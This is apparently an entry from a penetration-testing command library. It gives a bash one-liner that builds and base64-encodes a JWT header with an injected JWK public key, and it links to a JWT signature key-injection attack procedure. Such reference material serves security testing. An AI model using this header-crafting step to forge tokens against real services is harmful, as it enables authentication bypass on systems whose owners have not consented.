---
type: command
executor: bash
data: >-
  echo
  '{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","kid":"jwt_tool","use":"sig","e":"AQAB","n":"uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw"}}'
  | base64 -w0
tags:
  - jwt
  - header
  - craft
platforms:
  - Linux
  - macOS
verified: true
validated: true
---

# jwt-tool-create-header

## Command

```bash
echo '{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","kid":"jwt_tool","use":"sig","e":"AQAB","n":"uKBGiwYqpqPzbK6_fyEp71H3oWqYXnGJk9TG3y9K_uYhlGkJHmMSkm78PWSiZzVh7Zj0SFJuNFtGcuyQ9VoZ3m3AGJ6pJ5PiUDDHLbtyZ9xgJHPdI_gkGTmT02Rfu9MifP-xz2ZRvvgsWzTPkiPn-_cFHKtzQ4b8T3w1vswTaIS8bjgQ2GBqp0hHzTBGN26zIU08WClQ1Gq4LsKgNKTjdYLsf0e9tdDt8Pe5-KKWjmnlhekzp_nnb4C2DMpEc1iVDmdHV2_DOpf-kH_1nyuCS9_MnJptF1NDtL_lLUyjyWiLzvLYUshAyAW6KORpGvo2wJa2SlzVtzVPmfgGW7Chpw"}}' | base64 -w0
```

## Description

Crafts and base64-encodes a JWT header with an injected JWK public key for manual token construction.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| The echo string | JSON header with JWK | Yes |
| base64 -w0 | No-wrap base64 encoding | Yes |

## Examples

### Basic Usage

```bash
echo '{"alg":"RS256","typ":"JWT","jwk":...}' | base64 -w0
```

## Expected Output

eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJraWQiOiJqd3RfdG9vbCIsInVzZSI6InNpZyIsImUiOiJBUUFCIiwibiI6InVLQkdpd1lx... (base64 header)

## Related

- [[procedures/JWT-Signature-Key-Injection-Attack]]
- [[tools/jwt-tool]]
